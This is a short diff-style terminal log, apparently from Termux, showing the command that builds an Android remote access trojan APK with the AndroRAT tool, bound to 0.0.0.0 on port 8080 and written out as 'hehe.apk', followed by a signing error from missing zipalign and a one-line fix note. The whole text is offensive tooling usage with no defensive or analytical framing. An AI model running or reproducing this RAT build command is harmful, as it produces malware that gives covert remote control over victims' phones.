@@ -1,0 +1,12 @@
+python3 androRAT.py --build -i 0.0.0.0 -p 8080 -o hehe.apk
+[INFO] Generating APK
+[INFO] Building APK |
+[SUCCESS] Successfully apk built in /data/data/com.termux/files/home/AndroRAT/hehe.apk
+[INFO] Signing the apk
+[INFO] Signing Apk |
+could not execute zipalign
+Run with '--debug' parameter to get additional information.
+
+[ERROR] Signing Failed
+
+fix - pkg install apt
